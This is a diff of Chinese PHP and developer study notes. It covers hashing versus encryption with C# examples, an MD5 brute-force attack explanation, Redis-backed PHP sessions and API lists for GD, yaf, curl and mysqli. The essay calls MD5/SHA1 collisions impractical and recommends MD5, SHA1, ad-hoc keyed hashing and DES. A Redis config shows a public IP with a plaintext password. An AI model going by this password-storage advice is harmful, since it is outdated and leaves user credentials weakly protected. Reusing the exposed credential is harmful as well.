-      有了以上定义，就很清楚为什么会存在上文提到的两个区别了。由于哈希算法的定义域是一个无限集合，而值域是一个有限集合，将无限集合映射到有限集合，根据“鸽笼原理(Pigeonhole principle)”，每个哈希结果都存在无数个可能的目标文本，因此哈希不是一一映射，是不可逆的。
+但是，符合上面两个定义的映射仅仅可以被叫做哈希算法和加密算法，但未必是好的哈希和加密，好的哈希和加密往往需要一些附加条件，下面介绍这些内容。
 
-      而加密算法是一一映射，因此理论上来说是可逆的。
+一个设计良好的哈希算法应该很难从哈希结果找到哈希目标文本的碰撞（Collision）。那么什么是碰撞呢？对于一个哈希算法H，如果，则S1和S2互为碰撞。关于为什么好的哈希需要难以寻找碰撞，在下面讲应用的时候会详解。另外，好的哈希算法应该对于输入的改变极其敏感，即使输入有很小的改动，如一亿个字符变了一个字符，那么结果应该截然不同。这就是为什么哈希可以用来检测软件的完整性。
 
-      但是，符合上面两个定义的映射仅仅可以被叫做哈希算法和加密算法，但未必是好的哈希和加密，好的哈希和加密往往需要一些附加条件，下面介绍这些内容。
+一个设计良好的加密算法应该是一个“单向陷门函数(Trapdoor one-way function)”，单向陷门函数的特点是一般情况下即使知道函数本身也很难将函数的值转换回函数的自变量，具体到加密也就是说很难从密文得到明文，虽然从理论上这是可行的，而“陷门”是一个特殊的元素，一旦知道了陷门，则这种逆转换则非常容易进行，具体到加密算法，陷门就是密钥。
 
-      一个设计良好的哈希算法应该很难从哈希结果找到哈希目标文本的碰撞（Collision）。那么什么是碰撞呢？对于一个哈希算法H，如果，则S1和S2互为碰撞。关于为什么好的哈希需要难以寻找碰撞，在下面讲应用的时候会详解。另外，好的哈希算法应该对于输入的改变极其敏感，即使输入有很小的改动，如一亿个字符变了一个字符，那么结果应该截然不同。这就是为什么哈希可以用来检测软件的完整性。
-
-      一个设计良好的加密算法应该是一个“单向陷门函数(Trapdoor one-way function)”，单向陷门函数的特点是一般情况下即使知道函数本身也很难将函数的值转换回函数的自变量，具体到加密也就是说很难从密文得到明文，虽然从理论上这是可行的，而“陷门”是一个特殊的元素，一旦知道了陷门，则这种逆转换则非常容易进行，具体到加密算法，陷门就是密钥。
-
-      顺便提一句，在加密中，应该保密的仅仅是明文和密钥。也就是说我们通常假设攻击者对加密算法和密文了如指掌，因此加密的安全性应该仅仅依赖于密钥而不是依赖于假设攻击者不知道加密算法。
+顺便提一句，在加密中，应该保密的仅仅是明文和密钥。也就是说我们通常假设攻击者对加密算法和密文了如指掌，因此加密的安全性应该仅仅依赖于密钥而不是依赖于假设攻击者不知道加密算法。
 
 3、哈希（Hash）与加密（Encrypt）在软件开发中的应用
-      哈希与加密在现代工程领域应用非常广泛，在计算机领域也发挥了很大作用，这里我们仅仅讨论在平常的软件开发中最常见的应用——数据保护。
 
-      所谓数据保护，是指在数据库被非法访问的情况下，保护敏感数据不被非法访问者直接获取。这是非常有现实意义的，试想一个公司的安保系统数据库服务器被入侵，入侵者获得了所有数据库数据的查看权限，如果管理员的口令（Password）被明文保存在数据库中，则入侵者可以进入安保系统，将整个公司的安保设施关闭，或者删除安保系统中所有的信息，这是非常严重的后果。但是，如果口令经过良好的哈希或加密，使得入侵者无法获得口令明文，那么最多的损失只是被入侵者看到了数据库中的数据，而入侵者无法使用管理员身份进入安保系统作恶。
+哈希与加密在现代工程领域应用非常广泛，在计算机领域也发挥了很大作用，这里我们仅仅讨论在平常的软件开发中最常见的应用——数据保护。
+
+所谓数据保护，是指在数据库被非法访问的情况下，保护敏感数据不被非法访问者直接获取。这是非常有现实意义的，试想一个公司的安保系统数据库服务器被入侵，入侵者获得了所有数据库数据的查看权限，如果管理员的口令（Password）被明文保存在数据库中，则入侵者可以进入安保系统，将整个公司的安保设施关闭，或者删除安保系统中所有的信息，这是非常严重的后果。但是，如果口令经过良好的哈希或加密，使得入侵者无法获得口令明文，那么最多的损失只是被入侵者看到了数据库中的数据，而入侵者无法使用管理员身份进入安保系统作恶。
 
 3.1、哈希（Hash）与加密（Encrypt）的选择
-      要实现上述的数据保护，可以选择使用哈希或加密两种方式。那么在什么时候该选择哈希、什么时候该选择加密呢？
+要实现上述的数据保护，可以选择使用哈希或加密两种方式。那么在什么时候该选择哈希、什么时候该选择加密呢？
 
-      基本原则是：如果被保护数据仅仅用作比较验证，在以后不需要还原成明文形式，则使用哈希；如果被保护数据在以后需要被还原成明文，则需要使用加密。
+基本原则是：如果被保护数据仅仅用作比较验证，在以后不需要还原成明文形式，则使用哈希；如果被保护数据在以后需要被还原成明文，则需要使用加密。
 
-      例如，你正在做一个系统，你打算当用户忘记自己的登录口令时，重置此用户口令为一个随机口令，而后将此随机口令发给用户，让用户下次使用此口令登录，则适合使用哈希。实际上很多网站都是这么做的，想想你以前登录过的很多网站，是不是当你忘记口令的时候，网站并不是将你忘记的口令发送给你，而是发送给你一个新的、随机的口令，然后让你用这个新口令登录。这是因为你在注册时输入的口令被哈希后存储在数据库里，而哈希算法不可逆，所以即使是网站管理员也不可能通过哈希结果复原你的口令，而只能重置口令。
+例如，你正在做一个系统，你打算当用户忘记自己的登录口令时，重置此用户口令为一个随机口令，而后将此随机口令发给用户，让用户下次使用此口令登录，则适合使用哈希。实际上很多网站都是这么做的，想想你以前登录过的很多网站，是不是当你忘记口令的时候，网站并不是将你忘记的口令发送给你，而是发送给你一个新的、随机的口令，然后让你用这个新口令登录。这是因为你在注册时输入的口令被哈希后存储在数据库里，而哈希算法不可逆，所以即使是网站管理员也不可能通过哈希结果复原你的口令，而只能重置口令。
 
-      相反，如果你做的系统要求在用户忘记口令的时候必须将原口令发送给用户，而不是重置其口令，则必须选择加密而不是哈希。
+相反，如果你做的系统要求在用户忘记口令的时候必须将原口令发送给用户，而不是重置其口令，则必须选择加密而不是哈希。
 
 3.2、使用简单的一次哈希（Hash）方法进行数据保护
-      首先我们讨论使用一次哈希进行数据保护的方法，其原理如下图所示：
 
+首先我们讨论使用一次哈希进行数据保护的方法，其原理如下图所示：
 
-
-      对上图我想已无需多言，很多朋友应该使用过类似的哈希方法进行数据保护。当前最常用的哈希算法是MD5和SHA1，下面给出在.NET平台上用C#语言实现MD5和SHA1哈希的代码，由于.NET对于这两个哈希算法已经进行很很好的封装，因此我们不必自己实现其算法细节，直接调用相应的库函数即可（实际上MD5和SHA1算法都十分复杂，有兴趣的可以参考维基百科）。
-
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
+对上图我想已无需多言，很多朋友应该使用过类似的哈希方法进行数据保护。当前最常用的哈希算法是MD5和SHA1，下面给出在.NET平台上用C#语言实现MD5和SHA1哈希的代码，由于.NET对于这两个哈希算法已经进行很很好的封装，因此我们不必自己实现其算法细节，直接调用相应的库函数即可（实际上MD5和SHA1算法都十分复杂，有兴趣的可以参考维基百科）。
+```
 using System;
 using System.Web.Security;
  
@@ -20552,50 +19995,20 @@ namespace HashAndEncrypt
         }
     }
 }
+```
 3.3、对简单哈希（Hash）的攻击
-      下面我们讨论上述的数据保护方法是否安全。
+下面我们讨论上述的数据保护方法是否安全。
 
-      对于哈希的攻击，主要有寻找碰撞法和穷举法。
+对于哈希的攻击，主要有寻找碰撞法和穷举法。
 
-      先来说说寻找碰撞法。从哈希本身的定义和上面的数据保护原理图可以看出，如果想非法登录系统，不一定非要得到注册时的输入口令，只要能得到一个注册口令的碰撞即可。因此，如果能从杂凑串中分析出一个口令的碰撞，则大功告成。
+先来说说寻找碰撞法。从哈希本身的定义和上面的数据保护原理图可以看出，如果想非法登录系统，不一定非要得到注册时的输入口令，只要能得到一个注册口令的碰撞即可。因此，如果能从杂凑串中分析出一个口令的碰撞，则大功告成。
 
-      不过我的意见是，对这种攻击大可不必担心，因为目前对于MD5和SHA1并不存在有效地寻找碰撞方法。虽然我国杰出的数学家王小云教授曾经在国际密码学会议上发布了对于MD5和SHA1的碰撞寻找改进算法，但这种方法和很多人口中所说的“破解”相去甚远，其理论目前仅具有数学上的意义，她将破解MD5的预期步骤数从2^80降到了2^69，虽然从数学上降低了好几个数量级，但2^69对于实际应用来说仍然是一个天文数字，就好比以前需要一亿年，现在需要一万年一样。
+不过我的意见是，对这种攻击大可不必担心，因为目前对于MD5和SHA1并不存在有效地寻找碰撞方法。虽然我国杰出的数学家王小云教授曾经在国际密码学会议上发布了对于MD5和SHA1的碰撞寻找改进算法，但这种方法和很多人口中所说的“破解”相去甚远，其理论目前仅具有数学上的意义，她将破解MD5的预期步骤数从2^80降到了2^69，虽然从数学上降低了好几个数量级，但2^69对于实际应用来说仍然是一个天文数字，就好比以前需要一亿年，现在需要一万年一样。
 
-      不过这并不意味着使用MD5或SHA1后就万事大吉了，因为还有一种对于哈希的攻击方法——穷举法。通俗来说，就是在一个范围内，如从000000到999999，将其中所有值一个一个用相同的哈希算法哈希，然后将结果和杂凑串比较，如果相同，则这个值就一定是源字串或源字串的一个碰撞，于是就可以用这个值非法登录了。
+不过这并不意味着使用MD5或SHA1后就万事大吉了，因为还有一种对于哈希的攻击方法——穷举法。通俗来说，就是在一个范围内，如从000000到999999，将其中所有值一个一个用相同的哈希算法哈希，然后将结果和杂凑串比较，如果相同，则这个值就一定是源字串或源字串的一个碰撞，于是就可以用这个值非法登录了。
 
-      例如，下文是对MD5的穷举攻击的代码（设攻击范围为000000到999999）：
-
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
+例如，下文是对MD5的穷举攻击的代码（设攻击范围为000000到999999）：
+```
 using System;
 using System.Web.Security;
  
@@ -20627,41 +20040,16 @@ namespace HashAndEncrypt
         }
     }
 }
-      这种看似笨拙的方法，在现实中爆发的能量却是惊人的，目前几乎所有的MD5破解机或MD5在线破解都是用这种穷举法，但就是这种“笨”方法，却成功破解出很多哈希串。纠其缘由，就是相当一部分口令是非常简单的，如“123456”或“000000”这种口令还有很多人在用，可以看出，穷举法是否能成功很大程度上取决于口令的复杂性。因为穷举法扫描的区间往往是单字符集、规则的区间，或者由字典数据进行组合，因此，如果使用复杂的口令，例如“ASDF#$%uiop.8930”这种变态级口令，穷举法就很难奏效了。
+```
+这种看似笨拙的方法，在现实中爆发的能量却是惊人的，目前几乎所有的MD5破解机或MD5在线破解都是用这种穷举法，但就是这种“笨”方法，却成功破解出很多哈希串。纠其缘由，就是相当一部分口令是非常简单的，如“123456”或“000000”这种口令还有很多人在用，可以看出，穷举法是否能成功很大程度上取决于口令的复杂性。因为穷举法扫描的区间往往是单字符集、规则的区间，或者由字典数据进行组合，因此，如果使用复杂的口令，例如“ASDF#$%uiop.8930”这种变态级口令，穷举法就很难奏效了。
 
 3.4、对一次哈希（Hash）的改进——多重混合哈希（Hash）
-      上面说过，如果口令过于简单，则使用穷举法可以很有效地破解出一次哈希后的杂凑串。如果不想这样，只有让用户使用复杂口令，但是，很多时候我们并不能强迫用户，因此，我们需要想一种办法，即使用户使用诸如“000000”这种简单密码，也令穷举法难奏效。其中一种办法就是使用多重哈希，所谓多重哈希就是使用不同的哈希函数配合自定义的Key对口令进行多次哈希，如果Key很复杂，那么穷举法将变得异常艰难。
+上面说过，如果口令过于简单，则使用穷举法可以很有效地破解出一次哈希后的杂凑串。如果不想这样，只有让用户使用复杂口令，但是，很多时候我们并不能强迫用户，因此，我们需要想一种办法，即使用户使用诸如“000000”这种简单密码，也令穷举法难奏效。其中一种办法就是使用多重哈希，所谓多重哈希就是使用不同的哈希函数配合自定义的Key对口令进行多次哈希，如果Key很复杂，那么穷举法将变得异常艰难。
 
-      例如，如果使用下面的混合公式进行哈希：
+例如，如果使用下面的混合公式进行哈希：
 
-
-
-      如果将Key设为一个极为复杂的字符串，那么在攻击者不知道Key的情况下，几乎无法通过穷举法破解。因为即使S很简单，但是Key的MD5值几乎是无法在合理时间内穷举完的。下面是这种多重混合哈希的代码实现：
-
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
+如果将Key设为一个极为复杂的字符串，那么在攻击者不知道Key的情况下，几乎无法通过穷举法破解。因为即使S很简单，但是Key的MD5值几乎是无法在合理时间内穷举完的。下面是这种多重混合哈希的代码实现：
+```
 using System;
 using System.Web.Security;
  
@@ -20686,56 +20074,10 @@ namespace HashAndEncrypt
         }
     }
 }
+```
 3.5、使用加密（Encrypt）方法进行数据保护
-      加密方法如果用于口令保护的话，与上述哈希方法的流程基本一致，只是在需要时，可以使用解密方法得到明文。关于加密本身是一个非常庞大的系统，而对于加密算法的攻击更是可以写好几本书了，所以这里从略。下面只给出使用C#进行DES加密和解密的代码。
-
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
-44
-45
-46
-47
+加密方法如果用于口令保护的话，与上述哈希方法的流程基本一致，只是在需要时，可以使用解密方法得到明文。关于加密本身是一个非常庞大的系统，而对于加密算法的攻击更是可以写好几本书了，所以这里从略。下面只给出使用C#进行DES加密和解密的代码。
+```
 using System;
 using System.Security.Cryptography;
 using System.Text;
@@ -20783,38 +20125,39 @@ namespace HashAndEncrypt
         }
     }
 }
+```
 4、总结
       密码学本身是一个非常深奥的数学分支，对于普通开发者，不需要了解过于深入的密码学知识。本文仅仅讲述哈希与加密的基础内容，并对两者做了比较，帮助读者明晰概念，另外，对一些实际应用情况进行了简单的讨论。希望本文对大家有所帮助。看了下时间，零点刚过，祝大家十一快乐！玩得开心！
-```
 
 ### php在储存session以什么形式存在
-```
 PHP为session的存储提供了三种方式: 文件/ 内存/ 自定义存储,默认是使用文件存储.
+
 在访问量大的网站上采用这种方式就不大合适,因为这样会导致大量的输入输出的冗余.
+
 我们可以在php.ini更改配置文件或者php脚本中通过相应的函数来设置session文件的存储类型
+
 来改变session文件的存储形式
-```
+
 ### Session 共享、存活时间
-```
 https://blog.csdn.net/m_nanle_xiaobudiu/article/details/81177698
+
 一、Session的原理
+
 以下以默认情况举例：
 
 session_start();之后，会生成一个唯一的session_id，每一个用户对应唯一一个session_id，每一个session_id对应服务器端的一个session文件。这个session文件存储着当前session_id的信息，比如下面，就存储了name和age的键值。
 
- 
-
 1、设置Session存储的引擎（本地服务器的文件还是redis等），【php.ini 文件】
-
+```
 [Session]
  
 session.save_handler = files
  
 session.save_path = /data/SessionLogs
- 
+``` 
 
 2、默认情况下的Session的使用 
-
+```
 <?php
 /**
  * session的使用
@@ -20828,44 +20171,39 @@ echo "<br>";
 $_SESSION['age'] = 26;
 $_SESSION['name'] = 'xiaobudiu';
 var_dump($_SESSION);
- 
+``` 
 
 3、在服务器中存储的形式是这样的
 
-
-
- 
-
- 
-
 二、使用Redis存储Session
+
 在网站访问量较大时，我们通常会做集群（比如nginx负载均衡等），这时，如何解决session会话的共享问题。
 
 （1）使用ip_hash或者自定义key做负载均衡轮询策略是一个办法，但由于有时候用户可能走代理，所以这个方法其实并不是那么完美。
 
 （2）另一个解决session共享问题的方法就是使用redis或者memcache缓存数据库去存储session，进而实现session共享问题。
 
- 
-
 1、设置php.ini 文件中的session.save_handle 和session.save_path
-
+```
 session.save_handler = Redis
  
 session.save_path = "tcp://localhost:6379"
+```
 注1：如果连接的是远程redis，需要将localhost换成对应的远程ip地址。像这样，
-
+```
 session.save_handler = Redis
  
 session.save_path =  "tcp://47.94.203.119:6379"
+```
 注2：如果为redis已经添加了auth权限（requirpass），session.save_path项则应该这样写
-
+```
 session.save_handler = Redis
  
 session.save_path =  "tcp://47.94.203.119:6379?persistent=1&database=10&auth=myredisG506"
- 
+``` 
 
 2、使用redis存储session信息
-
+```
 <?php
 /**
  * 将session存储在redis中
@@ -20878,11 +20216,7 @@ $_SESSION['name'] = 'xiaobudiu';
 $_SESSION['sex'] = 'man';
 var_dump($_SESSION);
 在redis上是以这样的形式进行存储的
-
-
-
- 
-
+```
 注：
 
 搭建nginx集群： https://blog.csdn.net/m_nanle_xiaobudiu/article/details/80862272
@@ -20890,17 +20224,11 @@ var_dump($_SESSION);
 搭建mysql主从复制架构：https://blog.csdn.net/m_nanle_xiaobudiu/article/details/81086243
 
 搭建redis集群： https://blog.csdn.net/m_nanle_xiaobudiu/article/details/81004557
-
- 
  
 三、使用Redis存储Session，并设置Session会话存活时间以及Session中某一元素存活时间
- 
-
 封装session类 b.php
-
+```
 <?php
- 
- 
 /**
  * session控制类
  *
@@ -20964,7 +20292,7 @@ class Session
     }
  
 }
- 
+
 session类的使用：d.php
 
 <?php
@@ -20992,161 +20320,295 @@ var_dump($_SESSION);
 //删除当前session_id对应session文件
 //$session->destroy();
 //echo $session->get('sex');
- 
-
 redis中显示：
-
 ```
 
 ## 高阶篇
 
 ### GD库 图像处理扩展
-```
-[GD 和图像处理 函数
+GD 和图像处理 函数
+
 http://php.net/manual/zh/ref.image.php
+
 gd_info — 取得当前安装的 GD 库的信息
+
 getimagesize — 取得图像大小
+
 getimagesizefromstring — 从字符串中获取图像尺寸信息
+
 image_type_to_extension — 取得图像类型的文件后缀
+
 image_type_to_mime_type — 取得 getimagesize，exif_read_data，exif_thumbnail，exif_imagetype 所返回的图像类型的 MIME 类型
+
 image2wbmp — 以 WBMP 格式将图像输出到浏览器或文件
+
 imageaffine — 返回经过仿射变换后的图像，剪切区域可选
+
 imageaffinematrixconcat — Concatenate two affine transformation matrices
+
 imageaffinematrixget — Get an affine transformation matrix
+
 imagealphablending — 设定图像的混色模式
+
 imageantialias — 是否使用抗锯齿（antialias）功能
+
 imagearc — 画椭圆弧
+
 imagebmp — Output a BMP image to browser or file
+
 imagechar — 水平地画一个字符
+
 imagecharup — 垂直地画一个字符
+
 imagecolorallocate — 为一幅图像分配颜色
+
 imagecolorallocatealpha — 为一幅图像分配颜色 + alpha
+
 imagecolorat — 取得某像素的颜色索引值
+
 imagecolorclosest — 取得与指定的颜色最接近的颜色的索引值
+
 imagecolorclosestalpha — 取得与指定的颜色加透明度最接近的颜色
+
 imagecolorclosesthwb — 取得与给定颜色最接近的色度的黑白色的索引
+
 imagecolordeallocate — 取消图像颜色的分配
+
 imagecolorexact — 取得指定颜色的索引值
+
 imagecolorexactalpha — 取得指定的颜色加透明度的索引值
+
 imagecolormatch — 使一个图像中调色板版本的颜色与真彩色版本更能匹配
+
 imagecolorresolve — 取得指定颜色的索引值或有可能得到的最接近的替代值
+
 imagecolorresolvealpha — 取得指定颜色 + alpha 的索引值或有可能得到的最接近的替代值
+
 imagecolorset — 给指定调色板索引设定颜色
+
 imagecolorsforindex — 取得某索引的颜色
+
 imagecolorstotal — 取得一幅图像的调色板中颜色的数目
+
 imagecolortransparent — 将某个颜色定义为透明色
+
 imageconvolution — 用系数 div 和 offset 申请一个 3x3 的卷积矩阵
+
 imagecopy — 拷贝图像的一部分
+
 imagecopymerge — 拷贝并合并图像的一部分
+
 imagecopymergegray — 用灰度拷贝并合并图像的一部分
+
 imagecopyresampled — 重采样拷贝部分图像并调整大小
+
 imagecopyresized — 拷贝部分图像并调整大小
+
 imagecreate — 新建一个基于调色板的图像
+
 imagecreatefrombmp — 由文件或 URL 创建一个新图象。
+
 imagecreatefromgd2 — 从 GD2 文件或 URL 新建一图像
+
 imagecreatefromgd2part — 从给定的 GD2 文件或 URL 中的部分新建一图像
+
 imagecreatefromgd — 从 GD 文件或 URL 新建一图像
+
 imagecreatefromgif — 由文件或 URL 创建一个新图象。
+
 imagecreatefromjpeg — 由文件或 URL 创建一个新图象。
+
 imagecreatefrompng — 由文件或 URL 创建一个新图象。
+
 imagecreatefromstring — 从字符串中的图像流新建一图像
+
 imagecreatefromwbmp — 由文件或 URL 创建一个新图象。
+
 imagecreatefromwebp — 由文件或 URL 创建一个新图象。
+
 imagecreatefromxbm — 由文件或 URL 创建一个新图象。
+
 imagecreatefromxpm — 由文件或 URL 创建一个新图象。
+
 imagecreatetruecolor — 新建一个真彩色图像
+
 imagecrop — Crop an image to the given rectangle
+
 imagecropauto — Crop an image automatically using one of the available modes
+
 imagedashedline — 画一虚线
+
 imagedestroy — 销毁一图像
+
 imageellipse — 画一个椭圆
+
 imagefill — 区域填充
+
 imagefilledarc — 画一椭圆弧且填充
+
 imagefilledellipse — 画一椭圆并填充
+
 imagefilledpolygon — 画一多边形并填充
+
 imagefilledrectangle — 画一矩形并填充
+
 imagefilltoborder — 区域填充到指定颜色的边界为止
+
 imagefilter — 对图像使用过滤器
+
 imageflip — Flips an image using a given mode
+
 imagefontheight — 取得字体高度
+
 imagefontwidth — 取得字体宽度
+
 imageftbbox — 给出一个使用 FreeType 2 字体的文本框
+
 imagefttext — 使用 FreeType 2 字体将文本写入图像
+
 imagegammacorrect — 对 GD 图像应用 gamma 修正
+
 imagegd2 — 将 GD2 图像输出到浏览器或文件
+
 imagegd — 将 GD 图像输出到浏览器或文件
+
 imagegetclip — Get the clipping rectangle
+
 imagegif — 输出图象到浏览器或文件。
+
 imagegrabscreen — Captures the whole screen
+
 imagegrabwindow — Captures a window
+
 imageinterlace — 激活或禁止隔行扫描
+
 imageistruecolor — 检查图像是否为真彩色图像
+
 imagejpeg — 输出图象到浏览器或文件。
+
 imagelayereffect — 设定 alpha 混色标志以使用绑定的 libgd 分层效果
+
 imageline — 画一条线段
+
 imageloadfont — 载入一新字体
+
 imageopenpolygon — Draws an open polygon
+
 imagepalettecopy — 将调色板从一幅图像拷贝到另一幅
+
 imagepalettetotruecolor — Converts a palette based image to true color
+
 imagepng — 以 PNG 格式将图像输出到浏览器或文件
+
 imagepolygon — 画一个多边形
+
 imagepsbbox — 给出一个使用 PostScript Type1 字体的文本方框
+
 imagepsencodefont — 改变字体中的字符编码矢量
+
 imagepsextendfont — 扩充或精简字体
+
 imagepsfreefont — 释放一个 PostScript Type 1 字体所占用的内存
+
 imagepsloadfont — 从文件中加载一个 PostScript Type 1 字体
+
 imagepsslantfont — 倾斜某字体
+
 imagepstext — 用 PostScript Type1 字体把文本字符串画在图像上
+
 imagerectangle — 画一个矩形
+
 imageresolution — Get or set the resolution of the image
+
 imagerotate — 用给定角度旋转图像
+
 imagesavealpha — 设置标记以在保存 PNG 图像时保存完整的 alpha 通道信息（与单一透明色相反）
+
 imagescale — Scale an image using the given new width and height
+
 imagesetbrush — 设定画线用的画笔图像
+
 imagesetclip — Set the clipping rectangle
+
 imagesetinterpolation — Set the interpolation method
+
 imagesetpixel — 画一个单一像素
+
 imagesetstyle — 设定画线的风格
+
 imagesetthickness — 设定画线的宽度
+
 imagesettile — 设定用于填充的贴图
+
 imagestring — 水平地画一行字符串
+
 imagestringup — 垂直地画一行字符串
+
 imagesx — 取得图像宽度
+
 imagesy — 取得图像高度
+
 imagetruecolortopalette — 将真彩色图像转换为调色板图像
+
 imagettfbbox — 取得使用 TrueType 字体的文本的范围
+
 imagettftext — 用 TrueType 字体向图像写入文本
+
 imagetypes — 返回当前 PHP 版本所支持的图像类型
+
 imagewbmp — 以 WBMP 格式将图像输出到浏览器或文件
+
 imagewebp — 将 WebP 格式的图像输出到浏览器或文件
+
 imagexbm — 将 XBM 图像输出到浏览器或文件
+
 iptcembed — 将二进制 IPTC 数据嵌入到一幅 JPEG 图像中
+
 iptcparse — 将二进制 IPTC 块解析为单个标记
+
 jpeg2wbmp — 将 JPEG 图像文件转换为 WBMP 图像文件
+
 png2wbmp — 将 PNG 图像文件转换为 WBMP 图像文件
-```
 
 ### yaf
-```
-[Yet Another Framework
+Yet Another Framework
+
 http://php.net/manual/zh/book.yaf.php
+
 使用框架会降低性能, 经常举例的就是Zend Framework，采用框架能提高开发效率, 损失点性能也是值得的。
+
 有的项目组为了性能而选择某些框架，而另外一些项目组,，则为了更好的封装选择了另外的框架。
+
 Yaf框架既不会有损性能, 又能提高开发效率。
+
 Yaf有着和Zend Framework相似的API，相似的理念,，而同时又保持着对Bingo的兼容,，以此来提高开发效率,，规范开发习惯。本着对性能的追求, Yaf把框架中不易变的部分抽象出来，采用PHP扩展实现(c语言)，以此来保证性能。在作者自己做的简单测试中，Yaf和原生的PHP在同样功能下，性能损失小于10%，而和Zend Framework的对比中，Yaf的性能是Zend Framework的50-60倍。
+
 Yaf是一个C语言编写的PHP框架。
+
 Yaf的优点
+
 用C语言开发的PHP框架，相比原生的PHP，几乎不会带来额外的性能开销。
+
 所有的框架类，不需要编译，在PHP启动的时候加载，并常驻内存。
+
 更短的内存周转周期，提高内存利用率，降低内存占用率。
+
 灵巧的自动加载。支持全局和局部两种加载规则，方便类库共享。
+
 高性能的视图引擎。
+
 高度灵活可扩展的框架，支持自定义视图引擎，支持插件，支持自定义路由等等。
+
 内建多种路由, 可以兼容目前常见的各种路由协议.
+
 强大而又高度灵活的配置文件支持. 并支持缓存配置文件, 避免复杂的配置结构带来的性能损失.
+
 在框架本身,对危险的操作习惯做了禁止.
+
 更快的执行速度, 更少的内存占用.
+
 名词解释
+
 1、Yaf Yet Another Framework
 
 | adv. | 用于否定句和疑问句，谈论尚未发生但可能发生的事; 现在; 即刻; 马上; 从现在起直至某一时间; 还; |
@@ -21161,239 +20623,452 @@ Yaf的优点
 
 3、bootstrap v.独自创立; 靠一己之力做成; 附属于; 与…相联系;
 
-```
 
 ### curl
-```
-[Client URL
+Client URL
+
 http://php.net/manual/zh/book.curl.php
+
 Client URL 库
+
 简介
+
 安装／配置
+
 需求
+
 安装
+
 运行时配置
+
 资源类型
+
 预定义常量
+
 范例
+
 curl 基础例子
+
 cURL 函数
+
 curl_close — 关闭 cURL 会话
+
 curl_copy_handle — 复制一个cURL句柄和它的所有选项
+
 curl_errno — 返回最后一次的错误代码
+
 curl_error — 返回当前会话最后一次错误的字符串
+
 curl_escape — 使用 URL 编码给定的字符串
+
 curl_exec — 执行 cURL 会话
+
 curl_file_create — 创建一个 CURLFile 对象
+
 curl_getinfo — 获取一个cURL连接资源句柄的信息
+
 curl_init — 初始化 cURL 会话
+
 curl_multi_add_handle — 向curl批处理会话中添加单独的curl句柄
+
 curl_multi_close — 关闭一组cURL句柄
+
 curl_multi_errno — 返回上一次 curl 批处理的错误码
+
 curl_multi_exec — 运行当前 cURL 句柄的子连接
+
 curl_multi_getcontent — 如果设置了CURLOPT_RETURNTRANSFER，则返回获取的输出的文本流
+
 curl_multi_info_read — 获取当前解析的cURL的相关传输信息
+
 curl_multi_init — 返回一个新cURL批处理句柄
+
 curl_multi_remove_handle — 移除cURL批处理句柄资源中的某个句柄资源
+
 curl_multi_select — 等待所有cURL批处理中的活动连接
+
 curl_multi_setopt — 为 cURL 并行处理设置一个选项
+
 curl_multi_strerror — 返回字符串描述的错误代码
+
 curl_pause — 暂停和取消暂停一个连接。
+
 curl_reset — 重置一个 libcurl 会话句柄的所有的选项
+
 curl_setopt_array — 为 cURL 传输会话批量设置选项
+
 curl_setopt — 设置 cURL 传输选项
+
 curl_share_close — 关闭 cURL 共享句柄
+
 curl_share_errno — 返回共享 curl 句柄的最后一次错误号
+
 curl_share_init — 初始化一个 cURL 共享句柄。
+
 curl_share_setopt — 为 cURL 共享句柄设置选项。
+
 curl_share_strerror — 返回错误号对应的错误消息
+
 curl_strerror — 返回错误代码的字符串描述
+
 curl_unescape — 解码给定的 URL 编码的字符串
+
 curl_version — 获取 cURL 版本信息
+
 CURLFile — CURLFile 类
+
 CURLFile::__construct — 创建 CURLFile 对象
+
 CURLFile::getFilename — 获取被上传文件的 文件名
+
 CURLFile::getMimeType — 获取被上传文件的 MIME 类型
+
 CURLFile::getPostFilename — 获取 POST 请求时使用的 文件名
+
 CURLFile::setMimeType — 设置被上传文件的 MIME 类型
+
 CURLFile::setPostFilename — 设置 POST 请求时使用的文件名
+
 CURLFile::__wakeup — 反序列化句柄
-```
 
 ### mysqli
-```
-[mysql增强版
+
+mysql增强版
+
 http://php.net/manual/zh/book.mysqli.php
+
 MySQL增强版扩展
+
 简介
+
 Overview
+
 Quick start guide
+
 Dual procedural and object-oriented interface
+
 Connections
+
 Executing statements
+
 Prepared Statements
+
 Stored Procedures
+
 Multiple Statements
+
 API support for transactions
+
 Metadata
+
 安装／配置
+
 需求
+
 安装
+
 运行时配置
+
 资源类型
+
 mysqli 扩展和持久化连接
+
 预定义常量
+
 Notes
+
 MySQLi 扩展的功能概述
+
 MySQLi — MySQLi类
+
 mysqli::$affected_rows — Gets the number of affected rows in a previous MySQL operation
+
 mysqli::autocommit — 打开或关闭本次数据库连接的自动命令提交事务模式
+
 mysqli::begin_transaction — Starts a transaction
+
 mysqli::change_user — Changes the user of the specified database connection
+
 mysqli::character_set_name — 返回当前数据库连接的默认字符编码
+
 mysqli::close — 关闭先前打开的数据库连接
+
 mysqli::commit — 提交一个事务
+
 mysqli::$connect_errno — Returns the error code from last connect call
+
 mysqli::$connect_error — Returns a string description of the last connect error
+
 mysqli::__construct — Open a new connection to the MySQL server
+
 mysqli::debug — Performs debugging operations
+
 mysqli::dump_debug_info — 将调试信息输出到日志
+
 mysqli::errno — 返回最近函数调用的错误代码
+
 mysqli::$error_list — Returns a list of errors from the last command executed
+
 mysqli::$error — Returns a string description of the last error
+
 mysqli::$field_count — Returns the number of columns for the most recent query
+
 mysqli::get_charset — Returns a character set object
+
 mysqli::$client_info — 获取 MySQL 客户端信息
+
 mysqli_get_client_version — 作为一个整数返回MySQL客户端的版本
+
 mysqli::get_connection_stats — 返回客户端连接的统计数据
+
 mysqli::$host_info — 返回一个表述使用的连接类型的字符串
+
 mysqli::$protocol_version — 返回MySQL使用的协议版本号
+
 mysqli::$server_info — 返回MySQL服务器的版本号
+
 mysqli::$server_version — 作为一个整数返回MySQL服务器的版本
+
